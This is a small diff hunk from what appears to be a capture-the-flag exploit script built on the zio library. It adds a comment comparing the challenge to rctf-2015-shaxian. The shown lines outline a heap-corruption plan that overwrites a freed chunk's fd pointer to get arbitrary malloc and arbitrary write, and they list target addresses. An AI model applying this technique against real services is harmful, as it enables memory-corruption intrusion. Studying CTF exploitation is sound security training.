@@ -13,6 +13,7 @@ io              = zio(target, timeout = 100000000, print_read = read_c, print_wr
 # name          0x6020a0
 # mes           0x6020c0
 # exploit       malloc 1 -> free 1 -> edit 1 arbitrary fd ->malloc 1 -> malloc arbitrary -> arbitrary write
+# like rctf-2015-shaxian, cheat malloc to achieve leak ann arbitrary write.
 
 def leave(mes):
     io.read_until('5. Exit')
